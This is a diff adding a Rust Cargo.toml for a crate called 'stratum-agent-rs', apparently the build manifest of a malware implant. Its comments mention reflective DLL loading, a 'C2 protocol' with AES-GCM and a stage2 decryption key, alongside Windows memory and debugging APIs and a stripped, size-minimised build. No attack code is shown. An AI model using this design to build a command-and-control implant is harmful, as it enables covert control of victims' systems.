@@ -1,0 +1,64 @@
+[package]
+name = "stratum-agent-rs"
+version = "0.1.0"
+edition = "2021"
+
+[[bin]]
+name = "agent"
+path = "src/main.rs"
+
+[lib]
+name = "agent"
+crate-type = ["cdylib", "rlib"]
+path = "src/lib.rs"
+
+[build-dependencies]
+winres = "0.1"
+
+[dependencies]
+# HTTP — synchronous, no tokio, no IOCP threads (avoids TLS slot corruption in reflective DLL)
+ureq = { version = "3.3.0", default-features = false, features = ["rustls", "gzip"] }
+# RSA-4096 (OAEP + PSS via sha2 feature)
+rsa = { version = "0.9", features = ["pem", "sha2"] }
+# AES-256-GCM (C2 protocol)
+aes-gcm = "0.10"
+# AES-256-CBC + PBKDF2 (bootstrap key / stage2 decrypt only — crypto_compat.rs)
+aes = "0.8"
+cbc = { version = "0.1", features = ["alloc"] }
+# Encoding / misc
+base64 = "0.21"
+hex = "0.4"
+rand = { version = "0.8", features = ["getrandom"] }
+rand_distr = "0.4"
+pbkdf2 = "0.12"
+sha2 = "0.10"
+serde      = { version = "1", features = ["derive"] }
+serde_json = "1"
+chrono = { version = "0.4", default-features = false, features = ["clock"] }
+glob = "0.3"
+filetime = "0.2"
+zeroize = "1"
+
+[target.'cfg(windows)'.dependencies]
+windows-sys = { version = "0.52", features = [
+    "Win32_System_SystemInformation",
+    "Win32_System_WindowsProgramming",
+    "Win32_System_Threading",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_Kernel",
+    "Win32_Security",
+    "Win32_Security_Authorization",
+    "Win32_System_LibraryLoader",
+    "Win32_System_Memory",
+    "Win32_Foundation",
+] }
+
+[target.'cfg(unix)'.dependencies]
+libc = "0.2"
+
+[profile.release]
+opt-level    = "z"
+strip        = true
+panic        = "abort"
+lto          = true
+codegen-units = 1
